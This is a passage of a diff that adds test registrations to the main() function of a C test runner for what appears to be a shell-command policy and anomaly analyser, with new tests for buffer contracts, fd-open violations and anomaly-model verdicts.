   RUN(policy_wrapper_error_translation);
   RUN(policy_evaluation_allocation_failure);
 
@@ -5995,7 +7663,9 @@ int main(void) {
 
   printf("\nBuffer management:\n");
   RUN(buffer_contract_matrix);
+  RUN(graph_result_fields_stay_out_of_workspace);
   RUN(final_diagnostic_truncation_fails_closed);
+  RUN(suggestion_streaming_buffer_contract);
 
   printf("\nExpansion callbacks:\n");
   RUN(expansion_callback_matrix);
@@ -6005,10 +7675,15 @@ int main(void) {
 
   printf("\nViolation scanning:\n");
   RUN(violation_rule_matrix);
+  RUN(fd_open_violation_contract);
+  RUN(current_shell_builtin_graph_effects);
+  RUN(fd_open_dynamic_filename_consumer_contract);
   RUN(group_owned_violation_context);
   RUN(group_owned_multiple_redirect_violation_context);
   RUN(nested_group_owned_violation_scope);
   RUN(violation_configuration_matrix);
+  RUN(configured_shell_executable_matching);
+  RUN(quoted_environment_name_violation);
   RUN(violation_configuration_replacement_is_atomic);
   RUN(violation_capacity_contract);
   RUN(violation_dropped_types_remain_aggregated);
@@ -6044,6 +7719,8 @@ int main(void) {
   RUN(anomaly_cache_equivalence_matrix);
   RUN(anomaly_cache_allocation_failure_matrix);
   RUN(anomaly_type_netseq_allocation_failure);
+  RUN(anomaly_model_failure_verdict_contract);
+  RUN(anomaly_update_outcome_contract);
   RUN(anomaly_update_reuses_scored_netseq);
   RUN(anomaly_ansi_c_netseq_update);
   RUN(anomaly_cache_model_transition_matrix);
